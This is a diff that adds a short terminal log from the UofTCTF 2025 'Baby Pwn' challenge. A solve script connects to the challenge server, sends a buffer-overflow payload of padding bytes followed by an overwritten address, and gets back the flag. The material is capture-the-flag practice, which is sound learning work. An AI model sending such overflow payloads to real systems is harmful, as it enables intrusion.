@@ -1,0 +1,5 @@
+mito@mito-virtual-machine:~/CTF/UofTCTF_2025/Pwn_Baby_Pwn$ python3 solve.py r
+[+] Opening connection to 34.162.142.123 on port 5000: Done
+[*] Switching to interactive mode
+You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1a@
+Congratulations! Here is your flag: uoftctf{buff3r_0v3rfl0w5_4r3_51mp13_1f_y0u_kn0w_h0w_t0_d0_1t}
